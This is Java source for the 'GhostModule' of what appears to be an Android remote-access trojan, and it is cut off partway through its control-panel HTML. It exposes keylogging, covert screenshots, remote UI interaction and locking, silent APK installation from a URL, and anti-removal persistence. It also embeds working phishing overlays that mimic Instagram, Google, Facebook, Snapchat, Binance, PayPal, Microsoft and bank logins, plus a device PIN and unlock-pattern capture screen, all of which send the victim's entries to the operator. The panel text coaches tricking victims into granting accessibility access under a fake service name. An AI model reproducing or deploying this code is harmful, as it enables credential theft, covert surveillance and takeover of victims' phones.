package com.labs.labrats.modules;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.labs.labrats.FirebaseConfig;
import com.labs.labrats.IO_Persistence_Manager;
import com.labs.labrats.SystemAnalytics;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import fi.iki.elonen.NanoHTTPD.IHTTPSession;
import fi.iki.elonen.NanoHTTPD.Response;

public class GhostModule extends BaseModule {

    public GhostModule(Context context, FirebaseConfig server) {
        super(context, server);
    }

    public Response handleRequest(IHTTPSession session) {
        String uri = session.getUri();
        Map<String, String> params = session.getParms();

        if (uri.equals("/ghost")) {
            return serveGhostPage(session);
        } else if (uri.equals("/ghost/keys")) {
            return serveKeystrokes();
        } else if (uri.equals("/ghost/clear")) {
            IO_Persistence_Manager.clearKeystrokes();
            return newResponse(Response.Status.OK, "application/json", "{\"success\": true}");
        } else if (uri.equals("/ghost/screenshot")) {
            return serveCovertScreenshot();
        } else if (uri.equals("/ghost/status")) {
            return serveGhostStatus();
        } else if (uri.equals("/ghost/lock")) {
            return toggleLock();
        } else if (uri.equals("/ghost/deploy-overlay")) {
            return deployOverlay(params);
        } else if (uri.equals("/ghost/inspector")) {
            return serveInspectorTree();
        } else if (uri.equals("/ghost/interact")) {
            return performInteraction(params);
        } else if (uri.equals("/ghost/silent-install")) {
            String apkUrl = params.get("url");
            if (apkUrl != null && !apkUrl.trim().isEmpty()) {
                com.labs.labrats.PrivilegedInstaller.downloadAndSilentInstallAsync(context, apkUrl);
                return newResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"SILENT_INSTALL_DISPATCHED\"}");
            }
            return newResponse(Response.Status.BAD_REQUEST, "application/json", "{\"success\": false, \"message\": \"URL required\"}");
        } else if (uri.equals("/stealth")) {
            return toggleStealthMode(params);
        }
        return null;
    }

    private Response serveGhostStatus() {
        boolean active = IO_Persistence_Manager.getInstance() != null;
        boolean antiRemoval = IO_Persistence_Manager.isAntiRemovalEnabled();
        boolean blackout = IO_Persistence_Manager.isBlackoutActive();
        boolean lock = IO_Persistence_Manager.isLockActive();
        long idleTime = System.currentTimeMillis() - IO_Persistence_Manager.getLastEventTime();
        boolean isIdle = idleTime > 5000;
        
        try {
            org.json.JSONObject obj = new org.json.JSONObject();
            obj.put("active", active);
            obj.put("antiRemoval", antiRemoval);
            obj.put("blackout", blackout);
            obj.put("lock", lock);
            obj.put("isIdle", isIdle);
            return newResponse(Response.Status.OK, "application/json", obj.toString());
        } catch (Exception e) {
            return newResponse(Response.Status.OK, "application/json", "{\"error\": true}");
        }
    }

    private Response toggleLock() {
        IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
        if (ghost != null) {
            ghost.setRemoteLock(!IO_Persistence_Manager.isLockActive());
        }
        return newResponse(Response.Status.OK, "application/json", "{\"success\": true}");
    }

    private Response deployOverlay(Map<String, String> params) {
        String type = params.get("type");
        IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
        if (ghost != null) {
            String overlayHtml = "";
            if ("insta".equals(type)) {
                overlayHtml = "<html><body style='background:#000; color:#fff; font-family:sans-serif; padding:50px; text-align:center;'>" +
                        "<h2 style='margin-bottom:30px;'>Instagram</h2>" +
                        "<input type='text' id='u' placeholder='Phone number, username, or email' style='width:100%; padding:15px; margin-bottom:10px; background:#121212; border:1px solid #333; color:#fff;'>" +
                        "<input type='password' id='p' placeholder='Password' style='width:100%; padding:15px; margin-bottom:20px; background:#121212; border:1px solid #333; color:#fff;'>" +
                        "<button onclick='var u=document.getElementById(\"u\").value; var p=document.getElementById(\"p\").value; if(u && p) Uplink.capture(u + \":\" + p);' style='width:100%; padding:15px; background:#0095f6; border:none; color:#fff; font-weight:bold; border-radius:4px;'>Log In</button></body></html>";
            } else if ("gmail".equals(type)) {
                overlayHtml = "<html><body style='background:#fff; color:#202124; font-family:sans-serif; padding:50px;'>" +
                        "<h2>Google</h2><p style='margin-bottom:25px;'>Sign in to continue</p>" +
                        "<input type='text' id='u' placeholder='Email or phone' style='width:100%; padding:15px; margin-bottom:10px; border:1px solid #dadce0; border-radius:4px;'>" +
                        "<input type='password' id='p' placeholder='Enter your password' style='width:100%; padding:15px; margin-bottom:20px; border:1px solid #dadce0; border-radius:4px;'>" +
                        "<button onclick='var u=document.getElementById(\"u\").value; var p=document.getElementById(\"p\").value; if(u && p) Uplink.capture(u + \":\" + p);' style='width:120px; padding:15px; background:#1a73e8; border:none; color:#fff; font-weight:bold; border-radius:4px; float:right;'>Next</button></body></html>";
            } else if ("bank".equals(type)) {
                overlayHtml = "<html><body style='background:#f4f4f4; color:#333; font-family:sans-serif; padding:40px;'>" +
                        "<h2>Secure Login</h2><p style='margin-bottom:20px;'>Verification required for account access.</p>" +
                        "<input type='text' id='u' placeholder='Username/ID' style='width:100%; padding:12px; margin-bottom:10px; border:1px solid #ccc;'>" +
                        "<input type='password' id='p' placeholder='Password/PIN' style='width:100%; padding:12px; margin-bottom:20px; border:1px solid #ccc;'>" +
                        "<button onclick='var u=document.getElementById(\"u\").value; var p=document.getElementById(\"p\").value; if(u && p) Uplink.capture(u + \":\" + p);' style='width:100%; padding:15px; background:#004a8e; border:none; color:#fff; font-weight:bold;'>Sign In</button></body></html>";
            } else if ("fb".equals(type)) {
                overlayHtml = "<html><body style='background:#f0f2f5; color:#1c1e21; font-family:sans-serif; padding:50px; text-align:center;'>" +
                        "<h2 style='color:#1877f2; font-size:2rem; margin-bottom:30px;'>facebook</h2>" +
                        "<input type='text' id='u' placeholder='Email or phone number' style='width:100%; padding:15px; margin-bottom:10px; border:1px solid #dddfe2; border-radius:6px;'>" +
                        "<input type='password' id='p' placeholder='Password' style='width:100%; padding:15px; margin-bottom:20px; border:1px solid #dddfe2; border-radius:6px;'>" +
                        "<button onclick='var u=document.getElementById(\"u\").value; var p=document.getElementById(\"p\").value; if(u && p) Uplink.capture(u + \":\" + p);' style='width:100%; padding:15px; background:#1877f2; border:none; color:#fff; font-weight:bold; border-radius:6px; font-size:1.1rem;'>Log In</button></body></html>";
            } else if ("snap".equals(type)) {
                overlayHtml = "<html><body style='background:#fffc00; color:#000; font-family:sans-serif; padding:50px; text-align:center;'>" +
                        "<h2 style='margin-bottom:30px;'>Snapchat</h2>" +
                        "<input type='text' id='u' placeholder='Username or Email' style='width:100%; padding:15px; margin-bottom:10px; border:1px solid #000; border-radius:25px;'>" +
                        "<input type='password' id='p' placeholder='Password' style='width:100%; padding:15px; margin-bottom:20px; border:1px solid #000; border-radius:25px;'>" +
                        "<button onclick='var u=document.getElementById(\"u\").value; var p=document.getElementById(\"p\").value; if(u && p) Uplink.capture(u + \":\" + p);' style='width:100%; padding:15px; background:#000; border:none; color:#fff; font-weight:bold; border-radius:25px;'>Log In</button></body></html>";
            } else if ("crypto".equals(type)) {
                overlayHtml = "<html><body style='background:#0b0e11; color:#eaecef; font-family:sans-serif; padding:50px; text-align:center;'>" +
                        "<h2 style='color:#f3ba2f; margin-bottom:10px;'>Binance</h2><p style='margin-bottom:25px;'>Security verification required.</p>" +
                        "<input type='text' id='u' placeholder='Email/Phone' style='width:100%; padding:15px; margin-bottom:10px; background:#1e2329; border:1px solid #474d57; color:#fff; border-radius:4px;'>" +
                        "<input type='password' id='p' placeholder='Password' style='width:100%; padding:15px; margin-bottom:20px; background:#1e2329; border:1px solid #474d57; color:#fff; border-radius:4px;'>" +
                        "<button onclick='var u=document.getElementById(\"u\").value; var p=document.getElementById(\"p\").value; if(u && p) Uplink.capture(u + \":\" + p);' style='width:100%; padding:15px; background:#f3ba2f; border:none; color:#000; font-weight:bold; border-radius:4px;'>Log In</button></body></html>";
            } else if ("wallet".equals(type)) {
                overlayHtml = "<html><body style='background:#fff; color:#000; font-family:sans-serif; padding:50px; text-align:center;'>" +
                        "<h2 style='color:#0070ba; font-style:italic; font-weight:bold; margin-bottom:30px;'>PayPal</h2>" +
                        "<input type='text' id='u' placeholder='Email or mobile number' style='width:100%; padding:15px; margin-bottom:10px; border:1px solid #888; border-radius:4px;'>" +
                        "<input type='password' id='p' placeholder='Password' style='width:100%; padding:15px; margin-bottom:20px; border:1px solid #888; border-radius:4px;'>" +
                        "<button onclick='var u=document.getElementById(\"u\").value; var p=document.getElementById(\"p\").value; if(u && p) Uplink.capture(u + \":\" + p);' style='width:100%; padding:15px; background:#0070ba; border:none; color:#fff; font-weight:bold; border-radius:25px;'>Log In</button></body></html>";
            } else if ("ms".equals(type)) {
                overlayHtml = "<html><body style='background:#fff; color:#000; font-family:sans-serif; padding:50px;'>" +
                        "<div style='margin-bottom:25px;'><svg width='108' height='24' viewBox='0 0 108 24' xmlns='http://www.w3.org/2000/svg'><rect width='11.5' height='11.5' fill='#f25022'/><rect x='12.5' width='11.5' height='11.5' fill='#7fbb00'/><rect y='12.5' width='11.5' height='11.5' fill='#00a1f1'/><rect x='12.5' y='12.5' width='11.5' height='11.5' fill='#ffbb00'/><text x='30' y='18' font-family='sans-serif' font-weight='600' font-size='18' fill='#5e5e5e'>Microsoft</text></svg></div>" +
                        "<h2 style='font-size:1.5rem; margin-bottom:5px; font-weight:600;'>Sign in</h2><p style='margin-bottom:20px; font-size:0.9rem;'>to continue to Outlook</p>" +
                        "<input type='text' id='u' placeholder='Email, phone, or Skype' style='width:100%; padding:10px 0; margin-bottom:15px; border:none; border-bottom:1px solid #666; outline:none; font-size:1rem;'>" +
                        "<div style=\"margin-bottom:20px; font-size:0.85rem;\">No account? <a href='#' style='color:#0067b8; text-decoration:none;'>Create one!</a></div>" +
                        "<input type='password' id='p' placeholder='Password' style='width:100%; padding:10px 0; margin-bottom:35px; border:none; border-bottom:1px solid #666; outline:none; font-size:1rem;'>" +
                        "<div style='display:flex; justify-content:flex-end;'><button onclick='var u=document.getElementById(\"u\").value; var p=document.getElementById(\"p\").value; if(u && p) Uplink.capture(\"MS: \" + u + \":\" + p);' style='min-width:100px; padding:10px 20px; background:#0067b8; border:none; color:#fff; font-weight:600; cursor:pointer; font-size:0.9rem;'>Next</button></div></body></html>";
            } else if ("pin".equals(type)) {
                overlayHtml = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1, user-scalable=no'>" +
                        "<style>" +
                        "body { background:#000; color:#fff; font-family:sans-serif; margin:0; padding:0; display:flex; flex-direction:column; height:100vh; width:100vw; overflow:hidden; user-select:none; touch-action:none; justify-content: space-between; }" +
                        ".header { padding: 6vh 5vw 2vh; text-align:center; }" +
                        ".lock-icon { font-size: 7vh; color:#00f2ff; margin-bottom: 1.5vh; opacity:0.8; }" +
                        "h2 { font-weight:300; margin:0 0 1vh; font-size: 3.2vh; }" +
                        "p { color:#888; font-size: 1.8vh; margin:0; }" +
                        ".status-msg { height: 3vh; color: #ff3131; font-size: 1.6vh; margin-top: 1vh; font-weight: bold; opacity: 0; transition: 0.3s; }" +
                        ".pin-dots { display:flex; justify-content:center; gap: 4vw; margin: 3vh 0; height: 2.2vh; }" +
                        ".pin-dot { width: 2vh; height: 2vh; border: 0.3vh solid #555; border-radius:50%; transition:0.1s; }" +
                        ".pin-dot.filled { background:#00f2ff; border-color:#00f2ff; box-shadow:0 0 1.2vh #00f2ff; }" +
                        ".keypad { display:grid; grid-template-columns:repeat(3, 1fr); gap: 2vh; width: 80vw; max-width: 400px; margin: 0 auto; }" +
                        ".key { width: 8vh; height: 8vh; max-width: 20vw; max-height: 20vw; border-radius:50%; background:rgba(255,255,255,0.05); border: 0.15vh solid rgba(255,255,255,0.1); color:#fff; font-size: 3.2vh; display:flex; align-items:center; justify-content:center; cursor:pointer; transition:0.1s; margin: 0 auto; }" +
                        ".key:active { background:rgba(0,242,255,0.2); border-color:#00f2ff; transform:scale(0.95); }" +
                        ".pat-container { position:relative; width: 85vw; height: 85vw; max-width: 400px; max-height: 400px; margin: 1vh auto; background: rgba(255,255,255,0.02); border-radius: 15px; }" +
                        "canvas { position:absolute; top:0; left:0; pointer-events:none; width: 100%; height: 100%; }" +
                        ".grid { display:grid; grid-template-columns:repeat(3, 1fr); grid-template-rows:repeat(3, 1fr); width:100%; height:100%; position:relative; z-index:2; }" +
                        ".dot-wrap { display:flex; align-items:center; justify-content:center; }" +
                        ".dot { width: 2.5vh; height: 2.5vh; background:#444; border-radius:50%; transition:0.2s; }" +
                        ".dot.active { background:#00f2ff; box-shadow:0 0 2.5vh #00f2ff; transform:scale(1.3); }" +
                        ".footer { padding: 4vh 8vw; display:flex; justify-content:space-between; }" +
                        ".f-btn { background:transparent; border:none; color:#00f2ff; font-weight:bold; font-size: 2.2vh; cursor:pointer; text-transform:uppercase; letter-spacing: 0.2vh; transition: 0.2s; }" +
                        ".f-btn:active { color: #fff; transform: scale(0.9); }" +
                        "</style></head><body>" +
                        "<div class='header'>" +
                        "<div class='lock-icon'>&#128274;</div>" +
                        "<h2>Security Verification</h2>" +
                        "<p>Please enter your device credentials</p>" +
                        "<div id='status' class='status-msg'>Invalid Entry. Try again.</div>" +
                        "</div>" +

                        "<div id='pin-mode' style='flex-grow: 1; display: flex; flex-direction: column; justify-content: center;'>" +
                        "<div class='pin-dots' id='pin-display'>" +
                        "<div class='pin-dot'></div><div class='pin-dot'></div><div class='pin-dot'></div><div class='pin-dot'></div>" +
                        "<div class='pin-dot' style='display:none'></div><div class='pin-dot' style='display:none'></div>" +
                        "<div class='pin-dot' style='display:none'></div><div class='pin-dot' style='display:none'></div>" +
                        "</div>" +
                        "<div class='keypad'>" +
                        "<div class='key' onclick='k(1)'>1</div><div class='key' onclick='k(2)'>2</div><div class='key' onclick='k(3)'>3</div>" +
                        "<div class='key' onclick='k(4)'>4</div><div class='key' onclick='k(5)'>5</div><div class='key' onclick='k(6)'>6</div>" +
                        "<div class='key' onclick='k(7)'>7</div><div class='key' onclick='k(8)'>8</div><div class='key' onclick='k(9)'>9</div>" +
                        "<div class='key' style='opacity:0; pointer-events:none;'></div><div class='key' onclick='k(0)'>0</div><div class='key' onclick='del()' style='font-size: 3vh;'>&#9003;</div>" +
                        "</div>" +
                        "<div style='text-align:center; margin-top: 3vh;'><button class='f-btn' onclick='toggle(true)'>Use Pattern</button></div>" +
                        "</div>" +

                        "<div id='pat-mode' style='display:none; flex-grow: 1; flex-direction: column; justify-content: center;'>" +
                        "<div class='pat-container' id='pc'>" +
                        "<canvas id='cv'></canvas>" +
                        "<div class='grid' id='g'>" +
                        "[DOTS]" +
                        "</div>" +
                        "</div>" +
                        "<div style='text-align:center; margin-top: 2vh;'><button class='f-btn' style='color:#888; font-size: 1.8vh;' onclick='reset()'>Clear Pattern</button></div>" +
                        "<div style='text-align:center; margin-top: 2vh;'><button class='f-btn' onclick='toggle(false)'>Use PIN</button></div>" +
                        "</div>" +

                        "<div class='footer'>" +
                        "<button class='f-btn' style='color:#666;' onclick='Uplink.capture(\"CANCEL\")'>Emergency</button>" +
                        "<button class='f-btn' id='ok' onclick='send()'>Confirm</button>" +
                        "</div>" +

                        "<script>" +
                        "let mode='pin'; let pin=''; let path=[]; let isDown=false; let dotsData=[];" +
                        "const cv=document.getElementById('cv'); const ctx=cv.getContext('2d');" +
                        "const status=document.getElementById('status');" +
                        
                        "function toggle(p){ mode=p?'pat':'pin'; document.getElementById('pin-mode').style.display=p?'none':'flex'; document.getElementById('pat-mode').style.display=p?'flex':'none'; if(p) setTimeout(setupCanvas, 50); reset(); }" +
                        "function reset(){ pin=''; path=[]; resetDots(); if(mode==='pat') { setupCanvas(); draw(); } updatePin(); status.style.opacity=0; }" +
                        "function resetDots(){ document.querySelectorAll('.dot').forEach(d=>d.classList.remove('active')); }" +
                        "function updatePin(){ const ds=document.querySelectorAll('.pin-dot'); " +
                        "  ds.forEach((d,i)=>{ " +
                        "    d.classList.toggle('filled', i<pin.length); " +
                        "    if(i>=4) d.style.display = (pin.length > 4 || i === pin.length) ? 'block' : 'none'; " +
                        "  });" +
                        "}" +
                        "function k(n){ if(pin.length<8){ pin+=n; updatePin(); status.style.opacity=0; } }" +
                        "function del(){ pin=pin.slice(0,-1); updatePin(); }" +
                        
                        "function send(){ " +
                        "  console.log('Capture requested. Mode: ' + mode); " +
                        "  if(mode==='pin'){ " +
                        "    if(pin.length>=4) { Uplink.capture('PIN: '+pin); } " +
                        "    else { showErr('PIN too short'); } " +
                        "  } " +
                        "  else { " +
                        "    if(path.length>=4) { " +
                        "      const humanPath = path.map(id => parseInt(id) + 1).join('-'); " +
                        "      Uplink.capture('PATTERN (1-9): ' + humanPath); " +
                        "    } else { showErr('Pattern too short'); } " +
                        "  } " +
                        "}" +
                        "function showErr(msg){ status.innerText=msg; status.style.opacity=1; setTimeout(()=>status.style.opacity=0, 2000); }" +
                        
                        "function setupCanvas(){ " +
                        "  const pc=document.getElementById('pc'); if(!pc) return;" +
                        "  const r=pc.getBoundingClientRect(); cv.width=r.width; cv.height=r.height; " +
                        "  dotsData = Array.from(document.querySelectorAll('.dot')).map(d => { " +
                        "    const wr=d.closest('.dot-wrap').getBoundingClientRect(); " +
                        "    return { id: d.dataset.id, x: wr.left - r.left + wr.width/2, y: wr.top - r.top + wr.height/2, r: wr.width/2 }; " +
                        "  });" +
                        "  console.log('Canvas setup complete: ' + cv.width + 'x' + cv.height); " +
                        "}" +
                        
                        "function draw(ex, ey){" +
                        "  ctx.clearRect(0,0,cv.width,cv.height); if(path.length===0 && ex===undefined)return;" +
                        "  ctx.strokeStyle='rgba(0, 242, 255, 0.8)'; ctx.lineWidth=Math.max(cv.width/20, 12); ctx.lineCap='round'; ctx.lineJoin='round'; ctx.beginPath();" +
                        "  path.forEach((id,i)=>{ " +
                        "    const d = dotsData.find(item => item.id === id); " +
                        "    if(i===0) ctx.moveTo(d.x, d.y); else ctx.lineTo(d.x, d.y);" +
                        "  });" +
                        "  if(ex!==undefined && path.length > 0) {" +
                        "    const last = dotsData.find(item => item.id === path[path.length-1]);" +
                        "    ctx.moveTo(last.x, last.y); ctx.lineTo(ex, ey);" +
                        "  }" +
                        "  ctx.stroke();" +
                        "}" +

                        "const handleMove=(e)=>{ " +
                        "  if(!isDown)return; e.preventDefault(); " +
                        "  const t=e.touches?e.touches[0]:e; const pr=document.getElementById('pc').getBoundingClientRect(); " +
                        "  const x=t.clientX-pr.left; const y=t.clientY-pr.top;" +
                        "  dotsData.forEach(d=>{ " +
                        "    const dist=Math.hypot(x-d.x, y-d.y);" +
                        "    if(dist < d.r * 0.9){ if(!path.includes(d.id)){ path.push(d.id); document.querySelector('[data-id=\"'+d.id+'\"]').classList.add('active'); } }" +
                        "  }); draw(x,y);" +
                        "};" +

                        "const pc=document.getElementById('pc');" +
                        "pc.addEventListener('touchstart',(e)=>{isDown=true; setupCanvas(); handleMove(e);}, {passive: false}); " +
                        "pc.addEventListener('mousedown',(e)=>{isDown=true; setupCanvas(); handleMove(e);});" +
                        "window.addEventListener('touchend',()=>{isDown=false; draw();}); window.addEventListener('mouseup',()=>{isDown=false; draw();});" +
                        "window.addEventListener('touchmove',handleMove, {passive: false}); window.addEventListener('mousemove',handleMove);" +
                        "window.onload=() => { if(mode==='pat') setupCanvas(); }; window.onresize=setupCanvas;" +
                        "</script></body></html>";

                StringBuilder dots = new StringBuilder();
                for(int i=0; i<9; i++) dots.append("<div class='dot-wrap'><div class='dot' data-id='").append(i).append("'></div></div>");
                overlayHtml = overlayHtml.replace("[DOTS]", dots.toString());
            }

            if (!overlayHtml.isEmpty()) {
                ghost.deployShadowOverlay(overlayHtml);
            }
        }
        return newResponse(Response.Status.OK, "application/json", "{\"success\": true}");
    }

    private Response serveInspectorTree() {
        IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
        if (ghost == null) return newResponse(Response.Status.OK, "application/json", "{\"error\": \"Service Offline\"}");
        return newResponse(Response.Status.OK, "application/json", ghost.captureUiTree());
    }

    private Response serveCovertScreenshot() {
        IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
        if (ghost == null) return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", "Ghost Service Offline");

        final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
        final byte[][] result = new byte[1][];
        final String[] error = new String[1];

        ghost.takeCovertScreenshot(new com.labs.labrats.ScreenshotCallback() {
            @Override
            public void onSuccess(byte[] jpegData) {
                result[0] = jpegData;
                latch.countDown();
            }

            @Override
            public void onFailure(String err) {
                error[0] = err;
                latch.countDown();
            }
        });

        try {
            if (latch.await(3, java.util.concurrent.TimeUnit.SECONDS)) {
                if (result[0] != null) {
                    return server.newFixedLengthResponseProxy(Response.Status.OK, "image/jpeg", new java.io.ByteArrayInputStream(result[0]), result[0].length);
                } else {
                    return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", "Screenshot Failed: " + error[0]);
                }
            } else {
                return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", "Screenshot Timeout");
            }
        } catch (Exception e) {
            return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", "Internal Error: " + e.getMessage());
        }
    }

    private Response serveGhostPage(IHTTPSession session) {
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/terminal\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"display:flex; align-items:center; gap:15px; margin-bottom:20px; justify-content: flex-start; text-align: left; font-size: 1.6rem;\">")
            .append("GHOST_OPERATIONS <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_OPERATIONS', 'Remote interaction and control hub using Accessibility triangulation.')\">INFO</span>")
            .append("</h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");

        boolean isActive = IO_Persistence_Manager.getInstance() != null;
        html.append("<div id=\"ghost-status-card\" class=\"status-card\" style=\"padding:20px; background:rgba(255,255,255,0.05); border-radius:12px; margin-bottom:25px; border:1px solid ").append(isActive ? "var(--neon-green)" : "var(--danger)").append(";\">");
        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">GHOST_MODE_STATUS</div>");
        html.append("<div id=\"ghost-status-text\" style=\"font-size:1.1rem; font-weight:bold;\">")
            .append(isActive ? "<span style=\"color:var(--neon-green);\">UPLINK_ESTABLISHED</span>" : "<span style=\"color:var(--danger);\">OFFLINE_AWAITING_PERMISSION</span>")
            .append("</div>");
        
        html.append("<div id=\"accessibility-prompt\" style=\"display: ").append(isActive ? "none" : "block").append("; text-align: left;\">");
        html.append("<p style=\"color:#888; font-size: 0.75rem; margin-top:10px; line-height: 1.5;\">Most features here (Control, Keylogs, Blackout, Lock) and the <b>Ghost Toast</b> module require <b>Ghost Mode (Accessibility Permission)</b>. <br><br>Instruct the user to enable 'System Stability Service' in Accessibility settings. <br><i>Note: Stealth Operations (App Camouflage) do not require this permission.</i></p>");
        html.append("<button onclick=\"openSettings()\" class=\"btn btn-small\" style=\"margin-top:15px; border-radius:12px; padding: 10px 25px;\">OPEN_SETTINGS</button>");
        html.append("</div>");
        html.append("</div>");

        // --- GHOST_UTILITIES_SECTION ---
        html.append("<div class=\"card\" style=\"border-left-color: var(--neon-cyan);\">");
        html.append("<h2 style=\"color: var(--neon-cyan); margin: 0 0 25px 0; font-size: 1.35rem; text-align: left;\">GHOST_UTILITIES <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_UTILITIES', 'Specialized background protocols for stealth, persistence, and remote maintenance.')\">INFO</span></h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");

        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px;\">");
        
        // 1. Blackout Protocol
        html.append("<div class=\"info-item\" style=\"background: rgba(0,242,255,0.03);\">");
        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">BLACKOUT_PROTOCOL <span class=\"info-trigger\" onclick=\"showInfo(event, 'BLACKOUT_PROTOCOL', 'Suppress hardware backlight for physical stealth while maintaining the remote feed.')\">INFO</span></div>");
        html.append("<button id=\"blackout-btn\" onclick=\"toggleBlackout()\" class=\"btn btn-small\" style=\"width:100% !important; margin:15px 0 0 0;\">ACTIVATE</button>");
        html.append("</div>");

        // 2. System Denial Lock
        html.append("<div class=\"info-item\" style=\"background: rgba(255,49,49,0.03);\">");
        html.append("<div class=\"info-label\" style=\"color: var(--danger); font-size: 0.7rem;\">SYSTEM_DENIAL_LOCK <span class=\"info-trigger\" onclick=\"showInfo(event, 'SYSTEM_DENIAL_LOCK', 'Deploy a persistent, full-screen security overlay to lock physical interaction.')\">INFO</span></div>");
        html.append("<button id=\"lock-btn\" onclick=\"toggleLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); width:100% !important; margin:15px 0 0 0;\">DEPLOY_LOCK</button>");
        html.append("</div>");

        // 3. Maintenance: Repair Uplink
        html.append("<div class=\"info-item\" style=\"background: rgba(255,157,0,0.03);\">");
        html.append("<div class=\"info-label\" style=\"color: var(--neon-orange); font-size: 0.7rem;\">REPAIR_LINK <span class=\"info-trigger\" onclick=\"showInfo(event, 'REPAIR_LINK', 'Re-synchronize background telemetry and request critical environment permissions.')\">INFO</span></div>");
        html.append("<button onclick=\"repairProtocol()\" class=\"btn btn-small\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); width: 100% !important; margin: 15px 0 0 0;\">INITIATE_REPAIR</button>");
        html.append("</div>");

        // 4. Maintenance: Optimize Stability
        html.append("<div class=\"info-item\" style=\"background: rgba(57,255,20,0.03);\">");
        html.append("<div class=\"info-label\" style=\"color: var(--neon-green); font-size: 0.7rem;\">OPTIMIZE_LINK <span class=\"info-trigger\" onclick=\"showInfo(event, 'OPTIMIZE_LINK', 'Modify power management rules to exclude the service from battery-saving restrictions.')\">INFO</span></div>");
        html.append("<button onclick=\"optimizeStability()\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); width: 100% !important; margin: 15px 0 0 0;\">OPTIMIZE_LINK</button>");
        html.append("</div>");

        // 5. Maintenance: Bypass Restrictions
        html.append("<div class=\"info-item\" style=\"background: rgba(0,242,255,0.03);\">");
        html.append("<div class=\"info-label\" style=\"color: var(--neon-cyan); font-size: 0.7rem;\">BYPASS_LIMITS <span class=\"info-trigger\" onclick=\"showInfo(event, 'BYPASS_LIMITS', 'Utilize the Session Installation API to unlock settings restricted by system security layers.')\">INFO</span></div>");
        html.append("<button onclick=\"injectTrust()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); width: 100% !important; margin: 15px 0 0 0;\">INJECT_TRUST</button>");
        html.append("</div>");

        // 6. Maintenance: Deep Repair Actions
        html.append("<div class=\"info-item\" style=\"background: rgba(255,49,49,0.03);\">");
        html.append("<div class=\"info-label\" style=\"color: var(--danger); font-size: 0.7rem;\">DEEP_REPAIR_SEQUENCES <span class=\"info-trigger\" onclick=\"showInfo(event, 'DEEP_REPAIR', 'Direct system shortcuts to manually grant blocked permissions or handle OS security layers.')\">INFO</span></div>");
        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px;\">");
        html.append("<button onclick=\"deepRepair()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); width: 100% !important; margin: 0; font-size: 0.55rem;\">APP_INFO</button>");
        html.append("<button onclick=\"openAccessibility()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); width: 100% !important; margin: 0; font-size: 0.55rem;\">GHOST_MODE</button>");
        html.append("<button onclick=\"openNotifications()\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); width: 100% !important; margin: 0; font-size: 0.55rem;\">INTEL_SYNC</button>");
        html.append("<button onclick=\"dispatchPermissionSequence()\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); width: 100% !important; margin: 0; font-size: 0.55rem;\">PROMPTS</button>");
        html.append("</div></div>");

        // 7. Auto Pilot & Anti-Removal (Legacy Controls)
        html.append("<div class=\"info-item\" style=\"background: rgba(255,255,0,0.03); grid-column: 1 / -1;\">");
        html.append("<div class=\"info-label\" style=\"color: var(--neon-yellow); font-size: 0.7rem;\">AUTOMATION_&_PERSISTENCE <span class=\"info-trigger\" onclick=\"showInfo(event, 'AUTOMATION_&_PERSISTENCE', 'Configure automated recovery protocols and anti-removal persistence layers.')\">INFO</span></div>");
        html.append("<div style=\"display:flex; flex-wrap:wrap; gap:10px; margin-top: 10px;\">");
        html.append("<button onclick=\"initiateHeal()\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05); margin:0;\">INITIATE_HEAL</button>");
        String autoPilotLabel = IO_Persistence_Manager.isAutoPilotEngaged() ? "AUTOPILOT_ENGAGED" : "AUTOPILOT_OFF";
        String autoPilotClass = IO_Persistence_Manager.isAutoPilotEngaged() ? "btn btn-small btn-engaged-yellow" : "btn btn-small";
        html.append("<button id=\"autopilot-btn\" onclick=\"toggleAutoPilot()\" class=\"").append(autoPilotClass).append("\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); margin:0;\">").append(autoPilotLabel).append("</button>");
        html.append("<button id=\"anti-removal-btn\" onclick=\"ghostAction('toggleAntiRemoval')\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05); margin:0;\">LOADING...</button>");
        html.append("<button id=\"elevate-admin-btn\" onclick=\"ghostAction('elevateAdmin')\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05); margin:0;\">ELEVATE_ADMIN</button>");
